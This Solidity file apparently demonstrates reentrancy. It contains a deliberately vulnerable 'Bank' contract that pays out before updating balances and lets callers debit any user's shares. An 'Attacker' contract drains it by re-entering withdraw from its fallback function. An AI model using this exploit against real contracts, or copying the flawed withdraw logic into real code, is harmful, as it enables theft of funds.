pragma solidity ^0.4.18;

contract Bank {

    mapping (address => uint)public shares;

    function withdraw(uint money, address user)public {
    uint share = shares[user];
    if(money < share){
        if (!msg.sender.call.value(money)()){
        revert();
        }
        shares[user] -= money;
    }
}

    function deposit()public payable {
        shares[msg.sender] += msg.value;
    }

    function getBalance() public constant returns(uint) { return this.balance; }
}

contract Attacker {

    Bank v;
    uint num;
    uint attackfond = 1 ether;
    address public owner = msg.sender;

    event LogFallback(uint count, uint balance);

    function Attacker(address dao) public payable {
        v = Bank(dao);
    }

    function attack()public {
        v.withdraw(attackfond, owner);
    }

    function ()public payable {
        num++;
        LogFallback(num, this.balance);
        if(num < 30) v.withdraw(attackfond, owner);
    }

    function getBalance() public view returns(uint) {
      return this.balance;
     }

}
